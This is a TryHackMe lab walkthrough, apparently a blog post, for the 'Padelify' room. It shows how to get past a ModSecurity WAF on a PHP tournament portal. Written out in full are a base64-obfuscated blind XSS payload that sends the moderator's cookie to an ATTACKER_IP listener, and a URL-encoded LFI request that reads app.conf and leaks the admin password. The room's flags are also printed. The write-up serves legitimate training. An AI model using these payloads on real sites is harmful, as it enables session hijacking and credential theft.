---
title: "TryHackMe Padelify: blind XSS cookie theft to LFI admin takeover"
date: 2026-11-04T21:16:00+05:30
lastmod: 2026-11-04T21:16:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-padelify/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Bypassing WAF
  - WAF bypass
  - blind XSS
  - cookie theft
  - LFI
  - URL encoding bypass
  - ModSecurity
  - Web Application Red Teaming

draft: false
description: "TryHackMe Padelify walkthrough: blind XSS with base64 WAF bypass to steal moderator cookie, URL-encoded LFI to read admin credentials from app.conf."
---

This medium-difficulty room in the Bypassing WAF module of the Web Application Red Teaming path combines two classic WAF bypass techniques into one attack chain: blind XSS with payload obfuscation for the moderator flag, and URL-encoded LFI for the admin flag. The room follows [WAF: Exploitation Techniques](/post/thm-room-wafexploitationtechniques/) in the module and precedes [Farewell](/post/thm-room-farewell/).

## Task 1: Padelify

The room deploys a single VM running a PHP padel tournament registration portal behind ModSecurity. Two flags are hidden behind two roles: moderator and admin. The WAF blocks direct exploitation, so both require a bypass.

### Reconnaissance

Start with a port scan:

```
nmap -sC -sV 10.82.162.234
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.58
```

The web app at port 80 is a tournament registration portal (Padelify v1.4.2) with registration, login, and a moderator/admin dashboard.

Initial requests return 403 Forbidden. The WAF blocks automated scanners based on the User-Agent header. Sending an empty User-Agent (`-A ""`) bypasses this filter and returns 200.

Directory enumeration with an empty User-Agent reveals the key endpoints:

```
gobuster dir -u http://10.82.162.234/ -w common.txt -x php -t 5 -a ""
```

```
index.php       (200) - registration form
register.php    (302) - registration handler
login.php       (200) - authentication
dashboard.php   (302) - requires auth
live.php        (200) - live match feed with page parameter
status.php      (200) - service restart
/config/        (200) - directory listing with app.conf
/logs/          (200) - error.log
```

The error log at `/logs/error.log` reveals two important details: the config file path (`/var/www/html/config/app.conf`) and two active WAF rule IDs (99000005 for XSS, 41004 for double-encoding detection).

### Step 1: blind XSS to steal moderator cookie

The registration form submits username, password, level, and game type. A moderator bot periodically reviews pending registrations and renders usernames in the dashboard. This creates a blind XSS scenario: injected HTML/JS in the username field executes in the moderator's authenticated session when they view the registrations.

The WAF blocks common XSS keywords like `document.cookie` and `fetch` in request parameters. The bypass: `eval` and `atob` are not blocked, so the real payload can be base64-encoded and decoded at runtime.

First, base64-encode the cookie-stealing payload:

```
echo -n 'fetch("http://ATTACKER_IP:8888/?c="+document.cookie)' | base64 -w0
```

```
ZmV0Y2goImh0dHA6Ly9BVFRBQ0tFUl9JUDo4ODg4Lz9jPSIrZG9jdW1lbnQuY29va2llKQ==
```

Start an HTTP listener to catch the cookie:

```
python3 -m http.server 8888
```

Register with the XSS payload as the username:

```
curl -s -A "" http://10.82.162.234/register.php \
  --data-urlencode "username=<script>eval(atob('ZmV0Y2go...'))</script>" \
  -d "password=test123&level=amateur&game_type=single"
```

Within seconds, the moderator bot renders the registration and fires the XSS. The HTTP listener captures the moderator's session cookie:

```
GET /?c=PHPSESSID=ssdod0m17tmmra6vpd9669pq4f
```

Using this cookie to access the dashboard reveals the moderator flag.

**Moderator flag: THM{Logged_1n_Moderat0r}**

{{< ad >}}

### Step 2: LFI with URL-encoded dot to read admin credentials

The `/config/` directory listing shows `app.conf`, but requesting it directly returns 403. The WAF matches the literal string `app.conf` anywhere in REQUEST_URI, regardless of URL encoding in the path, HTTP method, or headers.

The key discovery is the `live.php` endpoint with a `page` parameter that performs local file inclusion. The WAF checks ARGS with `t:none` (no URL decoding transformation), meaning URL-encoded characters in query parameters are compared literally against the WAF rule's pattern.

The bypass: URL-encode the dot in `app.conf` as `%2e`. The WAF sees `app%2econf` (no match for `app.conf`), but PHP's `include()` decodes it to `app.conf` and reads the actual file:

```
curl -s -A "" "http://10.82.162.234/live.php?page=config/app%2econf"
```

```
version = "1.4.2"
env = "staging"
db_path = "padelify.sqlite"
admin_info = "bL}8,S9W1o44"
support_email = "support@padelify.thm"
```

The `admin_info` field contains the admin password. Log in as admin:

```
curl -s -A "" -c cookies.txt http://10.82.162.234/login.php \
  --data-urlencode 'username=admin' \
  --data-urlencode 'password=bL}8,S9W1o44'
```

The admin dashboard displays the second flag.

**Admin flag: THM{Logged_1n_Adm1n001}**

## Takeaways

1. **WAF keyword filters fail against encoding at the application layer.** The WAF checked raw parameter values without URL decoding (`t:none`), so `%2e` sailed through while PHP decoded it back to `.` for the file inclusion. The same principle applied to the XSS bypass: base64-encoding the payload hid the blocked keywords from the WAF's string matching, while `eval(atob(...))` reconstructed and executed them in the browser.

2. **Blind XSS through registration forms is a real-world pattern.** Any form whose contents are rendered in an admin or moderator panel is a potential stored XSS vector. The moderator never sees the payload directly, and the attacker never needs authentication to inject it. The WAF made this harder but not impossible, because the filter operated on input keywords rather than on the semantic behavior of the rendered output.

Room solved 100%: 1 task, 2 answers.
